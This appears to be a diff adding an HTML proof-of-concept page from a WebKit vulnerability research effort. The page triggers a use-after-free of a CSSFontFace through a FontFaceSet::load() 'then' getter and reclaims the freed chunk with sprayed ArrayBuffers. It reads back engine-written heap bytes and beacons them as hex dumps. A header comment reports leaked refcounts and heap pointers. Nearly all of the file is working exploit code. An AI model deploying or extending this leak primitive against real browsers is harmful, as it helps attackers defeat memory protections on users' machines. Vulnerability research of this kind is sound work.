@@ -1,0 +1,85 @@
+<!--
+  p563: reclaim the freed CSSFontFace chunk with ArrayBuffer data and read back
+  what the engine writes into it.
+
+  Trigger: the FontFaceSet::load() path from issue #143 / docs/WEBKIT_FINDINGS.md
+  Finding 12.  The `then` getter removes the victim @font-face style and drops the
+  face from document.fonts, which frees the CSSFontFace.  Inside the same getter,
+  before returning, thirteen size classes of ArrayBuffer are allocated and kept.
+  A 192-byte buffer takes the freed chunk; because ArrayBuffer data is zero-filled
+  at allocation, any non-zero byte afterwards was written by the engine.
+
+  Serve this page from tools/webkit_server.py (local, not in the repository) and
+  point results/webkit/corpus/direct.json at it.  Every beacon is a synchronous
+  XHR so that it leaves the renderer before a possible crash in the same call.
+
+  Measured on 14.10 (2026-10-29): U6-HIT-b19-s192-o0-n9, +0x00 = 1 (refcount),
+  +0x58 and +0x68 heap pointers.  Control without style.remove(): ALL-CLEAN.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p563 fontface reclaim leak</title>
+<script>
+/* par33 trigger verbatim, one trial, and the reclaim sweep inside the window:
+   the freed CSSFontFace chunk is claimed by whichever size class it belongs to.
+   No beacon, string, or XHR runs between the free and the allocations. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var SIZES = [64, 96, 128, 160, 192, 224, 256, 320, 384, 512, 768, 1024, 2048];
+var K = 8, styleEl = null, firedHere = false, done = false;
+function hex(v){ return ('0' + v.toString(16)).slice(-2); }
+function setup(){
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('P563-SETUP');
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var si = 0; si < SIZES.length; si++) {
+        var size = SIZES[si];
+        for (var k = 0; k < K; k++) {
+          var ab = new ArrayBuffer(size);
+          window.__map.push({ size: size, view: new Uint8Array(ab) });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('P563-LOAD-CALLED');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('P563-RESOLVED'); }, function(){ b('P563-REJECTED'); });
+  setTimeout(scan, 60);
+  setTimeout(scan, 400);
+  setTimeout(function(){ if (!done) b('P563-NOSCAN-fired-' + (firedHere ? 1 : 0)); }, 1500);
+}
+function scan(){
+  if (done) return;
+  var m = window.__map; if (!m || !m.length) return;
+  done = true;
+  var out = [];
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0, first = -1;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) { n++; if (first < 0) first = j; }
+    if (n) {
+      var s = '';
+      var stop = Math.min(v.length, first + 256); for (var j = first; j < stop; j++) s += hex(v[j]);
+      out.push('b' + i + '-s' + m[i].size + '-o' + first + '-n' + n + '-' + s);
+    }
+  }
+  if (!out.length) { b('P563-ALL-CLEAN-' + m.length); return; }
+  b('P563-HIT-' + out.join('_'));
+}
+function run(){ setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p563 fontface reclaim leak</p></body></html>
